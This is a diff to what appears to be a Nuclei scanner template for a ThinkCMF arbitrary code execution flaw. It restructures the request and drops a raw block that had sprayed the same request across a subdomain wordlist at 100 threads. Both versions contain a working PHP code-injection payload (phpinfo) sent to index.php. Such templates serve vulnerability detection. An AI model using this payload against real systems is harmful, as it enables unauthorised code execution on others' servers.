@@ -4,22 +4,15 @@ info:
   name: ThinkCMF Arbitrary code execution
   author: pikpikcu
   severity: high
-  reference: https://www.shuzhiduo.com/A/l1dygr36Je/
+  reference:
+    - https://www.shuzhiduo.com/A/l1dygr36Je/
   tags: thinkcmf
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20phpinfo();"
 
-    raw:
-      - |
-        GET /index.php?g=g&m=Door&a=index&content=<?php%20phpinfo(); HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
